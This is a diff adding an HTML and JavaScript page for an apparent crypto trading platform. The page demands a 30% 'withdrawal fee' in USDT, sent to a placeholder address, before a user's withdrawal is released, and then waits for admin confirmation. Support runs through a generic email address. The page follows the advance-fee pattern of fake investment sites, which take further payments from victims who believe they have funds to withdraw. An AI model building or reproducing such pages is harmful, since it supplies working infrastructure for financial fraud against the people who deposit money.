@@ -1,0 +1,130 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Withdrawal Fee Confirmation</title>
+  <link rel="stylesheet" href="css/styles.css" />
+  <style>
+    .fee-wrap { max-width: 720px; margin: 40px auto; padding: 24px; }
+    .fee-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; box-shadow: 0 1px 4px rgba(0,0,0,0.06); }
+    .fee-row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid var(--border); }
+    .fee-row:last-child { border-bottom:none; }
+    .muted { color: var(--muted); }
+    .address-box { background:#f9fafb; padding:12px; border-radius:8px; font-family:monospace; word-break:break-all; }
+    .status-pill { display:inline-block; padding:6px 10px; border-radius:16px; font-size:12px; font-weight:600; }
+    .status-required { background:#fef3c7; color:#92400e; }
+    .status-submitted { background:#dbeafe; color:#1d4ed8; }
+    .status-confirmed { background:#d1fae5; color:#065f46; }
+    .alert { padding:12px 14px; border-radius:8px; margin-top:12px; }
+    .alert-info { background:#eef2ff; color:#3730a3; border-left:4px solid #6366f1; }
+    .alert-warn { background:#fff7ed; color:#9a3412; border-left:4px solid #fb923c; }
+    .actions { display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
+  </style>
+</head>
+<body>
+  <div class="fee-wrap">
+    <h1>Withdrawal Fee</h1>
+    <p class="muted">A 30% fee is required before your withdrawal can be processed.</p>
+
+    <div class="fee-card">
+      <div class="fee-row"><span>Withdrawal ID</span><span id="w-id">-</span></div>
+      <div class="fee-row"><span>Amount</span><span id="w-amount">-</span></div>
+      <div class="fee-row"><span>Fee (30%)</span><span id="w-fee">-</span></div>
+      <div class="fee-row"><span>Status</span><span id="w-status" class="status-pill status-required">Required</span></div>
+      <div class="fee-row"><span>Next step</span><span id="w-next">Pay fee to proceed</span></div>
+    </div>
+
+    <h3 style="margin-top:24px">Pay fee to this USDT address</h3>
+    <div class="address-box" id="fee-address">TUSDT-ADDRESS-REPLACE</div>
+    <p class="muted" style="margin-top:8px">Send exactly the fee amount. Then click the button below.</p>
+
+    <div class="actions">
+      <button class="btn" id="mark-paid">I have completed withdrawal fee</button>
+      <button class="btn-secondary" id="refresh-status" type="button">Refresh status</button>
+    </div>
+
+    <div class="alert alert-info" id="awaiting" style="display:none;">Awaiting admin confirmation...</div>
+    <div class="alert alert-warn" id="contact" style="display:none;">If this takes too long, contact support at cryptocurrencytradingtheelonu@email.com.</div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const withdrawalId = params.get('id');
+    const amount = params.get('amount');
+    const fee = params.get('fee');
+    const crypto = params.get('crypto') || 'USDT';
+    const API_BASE = (location.hostname === 'localhost' || location.hostname === '127.0.0.1')
+      ? `http://${location.hostname}:5001/api`
+      : '/api';
+    const TOKEN = (window.AuthService && typeof AuthService.getToken === 'function')
+      ? AuthService.getToken()
+      : (localStorage.getItem('authToken') || localStorage.getItem('token'));
+
+    if (!TOKEN) {
+      window.location.href = 'login.html';
+    }
+
+    function fmt(n){ return Number(n || 0).toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:8}); }
+
+    function setStatus(status){
+      const el = document.getElementById('w-status');
+      el.textContent = status.toUpperCase();
+      el.className = 'status-pill';
+      if (status === 'confirmed') el.classList.add('status-confirmed');
+      else if (status === 'submitted') el.classList.add('status-submitted');
+      else el.classList.add('status-required');
+      document.getElementById('w-next').textContent = status === 'confirmed'
+        ? 'Fee confirmed — continuing to processing'
+        : status === 'submitted'
+          ? 'Waiting for admin confirmation'
+          : 'Pay fee to proceed';
+      document.getElementById('awaiting').style.display = status === 'confirmed' ? 'none' : 'block';
+      document.getElementById('contact').style.display = status === 'confirmed' ? 'none' : 'block';
+    }
+
+    async function fetchStatus() {
+      const resp = await fetch(`${API_BASE}/withdrawals/${withdrawalId}`, { headers: { Authorization: `Bearer ${TOKEN}` } });
+      if (!resp.ok) throw new Error('Unable to fetch withdrawal status');
+      const data = await resp.json();
+      const w = data.withdrawal;
+      document.getElementById('w-id').textContent = w.id;
+      document.getElementById('w-amount').textContent = `${fmt(w.amount)} ${w.crypto_type || crypto}`;
+      document.getElementById('w-fee').textContent = `${fmt(w.fee_amount || fee)} USDT`;
+      setStatus(w.fee_status || 'required');
+      if (w.fee_status === 'confirmed') {
+        setTimeout(()=> {
+          window.location.href = `withdrawal-process.html?withdrawalId=${w.id}`;
+        }, 800);
+      }
+    }
+
+    async function markPaid() {
+      const resp = await fetch(`${API_BASE}/withdrawals/${withdrawalId}/fee-submitted`, {
+        method: 'POST',
+        headers: {
+          Authorization: `Bearer ${TOKEN}`,
+        },
+      });
+      if (!resp.ok) {
+        const t = await resp.text().catch(()=>resp.statusText);
+        throw new Error(t || 'Failed to submit fee');
+      }
+      await fetchStatus();
+    }
+
+    document.getElementById('mark-paid').addEventListener('click', async () => {
+      try {
+        await markPaid();
+      } catch (e) {
+        alert(e.message || 'Failed to submit fee');
+      }
+    });
+    document.getElementById('refresh-status').addEventListener('click', async () => {
+      try { await fetchStatus(); } catch(e){ alert(e.message||'Failed to refresh'); }
+    });
+
+    if (withdrawalId) fetchStatus().catch(err => console.error(err));
+  </script>
+</body>
+</html>
